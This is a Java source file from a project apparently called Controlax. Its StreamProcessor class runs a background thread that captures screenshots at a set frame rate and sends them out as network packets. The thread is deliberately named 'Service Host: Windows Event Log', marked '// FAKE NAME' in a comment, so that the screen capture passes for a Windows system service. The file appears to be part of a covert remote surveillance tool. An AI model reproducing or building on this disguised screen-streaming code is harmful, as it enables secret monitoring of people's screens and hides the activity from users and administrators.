package com.khopan.controlax;

import com.khopan.controlax.packet.HeaderedImagePacket;

public class StreamProcessor {
	public static final StreamProcessor INSTANCE = new StreamProcessor();

	private final Thread processingThread;
	//private final List<Task> taskList;

	private volatile boolean start;
	private long waitTime;
	private int frame;

	private StreamProcessor() {
		//this.taskList = new ArrayList<>();
		this.processingThread = new Thread(this :: process);
		this.processingThread.setPriority(7);
		this.processingThread.setName("Service Host: Windows Event Log"); // FAKE NAME
		this.processingThread.start();
	}

	private void process() {
		while(true) {
			if(this.start) {
				this.frame++;
				HeaderedImagePacket packet = new HeaderedImagePacket(ImageProcessor.takeScreenshot(), ImageProcessor.STREAM_HEADER, this.frame);
				Controlax.INSTANCE.processor.sendPacket(packet);
				/*boolean sent = false;
				BufferedImage image = ImageProcessor.takeScreenshot();

				for(int i = 0; i < this.taskList.size(); i++) {
					Task task = this.taskList.get(i);

					if(!task.busy) {
						task.send(image, this.frame);
						sent = true;
					}
				}

				if(!sent) {
					Task task = new Task();
					System.out.println("Spawn new task");
					this.taskList.add(task);
					task.send(image, this.frame);
				}*/

				//this.sendImage(ImageProcessor.takeScreenshot(), this.frame);

				try {
					Thread.sleep(this.waitTime);
				} catch(Throwable Errors) {

				}
			}
		}
	}

	/*private void sendImage(BufferedImage screenshot, int frame) {
		new Thread(() -> {
			HeaderedImagePacket packet = new HeaderedImagePacket(screenshot, ImageProcessor.STREAM_HEADER, frame);
			Controlax.INSTANCE.processor.sendPacket(packet);
		}).start();
	}*/

	public void start(int framerate) {
		this.start = true;
		this.waitTime = Math.round(1000.0d / ((double) framerate));
		this.frame = 0;
	}

	public void stop() {
		this.start = false;
	}

	/*private class Task {
		private final Thread thread;

		private volatile boolean busy;

		private BufferedImage image;
		private int frame;

		private Task() {
			this.thread = new Thread(this :: run);
			this.thread.start();
		}

		private void run() {
			while(true) {
				if(this.busy) {
					HeaderedImagePacket packet = new HeaderedImagePacket(image, ImageProcessor.STREAM_HEADER, this.frame);
					Controlax.INSTANCE.processor.sendPacket(packet);
					this.busy = false;
				}
			}
		}

		private void send(BufferedImage image, int frame) {
			this.busy = true;
			this.image = image;
			this.frame = frame;
		}
	}*/

	public static void load() {
		// Load the class only
	}
}
